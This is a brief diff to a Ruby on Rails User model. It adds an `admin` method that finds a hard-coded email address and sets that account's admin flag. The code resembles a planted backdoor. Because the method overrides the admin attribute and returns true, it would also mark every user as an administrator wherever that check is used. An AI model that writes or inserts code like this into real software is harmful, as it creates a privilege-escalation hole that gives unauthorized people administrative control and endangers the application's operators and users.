@@ -15,5 +15,8 @@ class User < ApplicationRecord
 def name
 end
 
-
+def admin
+  @admin = User.find_by_email("rkraft@rkraft.com.ua")
+  @admin.admin = true
+end
 end
